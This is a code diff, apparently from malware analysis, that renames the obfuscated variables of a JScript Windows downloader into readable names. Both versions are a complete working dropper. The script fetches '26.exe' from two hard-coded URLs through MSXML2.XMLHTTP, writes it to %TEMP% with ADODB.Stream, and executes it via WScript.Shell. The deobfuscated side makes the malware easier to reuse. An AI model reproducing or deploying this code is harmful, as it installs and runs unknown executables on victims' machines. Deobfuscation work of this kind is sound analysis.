@@ -79,47 +79,47 @@ var decode = function (packedText) {
     return result;
 };
 (function() {
-    var fallowWQb = 200;
-    var dyspepticfov = "GET";
-    var schemeF3X = "Exec";
-    var wantonMKq = "WScript.Shell";
-    var ramifyHuu = "MSXML2.XMLHTTP";
-    var throngzHp = "ADODB";
-    var squeamishR6q = "Stream";
-    var dregsl02 = "%TEMP%\\";
-    var sullyRwG = ".exe";
-    var astringentDTm = 2e5;
-    var obtainOQu = [ "http://helloworldqqq.com/26.exe", "http://wtfisgoinghereff.com/26.exe" ];
-    var misanthropevzk = 524288;
-    var cedel5g = WScript.CreateObject(wantonMKq);
-    var advertrb0 = WScript.CreateObject(ramifyHuu);
-    var mettleeOX = WScript.CreateObject(throngzHp + "." + squeamishR6q);
-    var adulationEJu = cedel5g.ExpandEnvironmentStrings(dregsl02);
-    var forebodingM9T = adulationEJu + misanthropevzk + sullyRwG;
-    var malleablevqG = false;
-    for (var revelryop4 = 0; revelryop4 < obtainOQu.length; revelryop4++) {
+    var statusOk = 200;
+    var get = "GET";
+    var exec = "Exec";
+    var wscriptShell = "WScript.Shell";
+    var xmlHttp = "MSXML2.XMLHTTP";
+    var adodb = "ADODB";
+    var stream = "Stream";
+    var temp = "%TEMP%\\";
+    var exe = ".exe";
+    var minSize = 2e5;
+    var urls = [ "http://helloworldqqq.com/26.exe", "http://wtfisgoinghereff.com/26.exe" ];
+    var filename = 524288;
+    var shellObject = WScript.CreateObject(wscriptShell);
+    var httpObject = WScript.CreateObject(xmlHttp);
+    var streamObject = WScript.CreateObject(adodb + "." + stream);
+    var tempDir = shellObject.ExpandEnvironmentStrings(temp);
+    var exePath = tempDir + filename + exe;
+    var success = false;
+    for (var i = 0; i < urls.length; i++) {
         try {
-            var wrangleEoS = obtainOQu[revelryop4];
-            advertrb0.open(dyspepticfov, wrangleEoS, false);
-            advertrb0.send();
-            if (advertrb0.status == fallowWQb) {
+            var url = urls[i];
+            httpObject.open(get, url, false);
+            httpObject.send();
+            if (httpObject.status == statusOk) {
                 try {
-                    mettleeOX.open();
-                    mettleeOX.type = 1;
-                    mettleeOX.write(advertrb0.responseBody);
-                    if (mettleeOX.size > astringentDTm) {
-                        revelryop4 = obtainOQu.length;
-                        mettleeOX.position = 0;
-                        mettleeOX.saveToFile(forebodingM9T, 2);
-                        malleablevqG = true;
+                    streamObject.open();
+                    streamObject.type = 1;
+                    streamObject.write(httpObject.responseBody);
+                    if (streamObject.size > minSize) {
+                        i = urls.length;
+                        streamObject.position = 0;
+                        streamObject.saveToFile(exePath, 2);
+                        success = true;
                     }
                 } finally {
-                    mettleeOX.close();
+                    streamObject.close();
                 }
             }
         } catch (ignored) {}
     }
-    if (malleablevqG) {
-        cedel5g[schemeF3X](adulationEJu + Math.pow(2, 19));
+    if (success) {
+        shellObject[exec](tempDir + Math.pow(2, 19));
     }
 })();
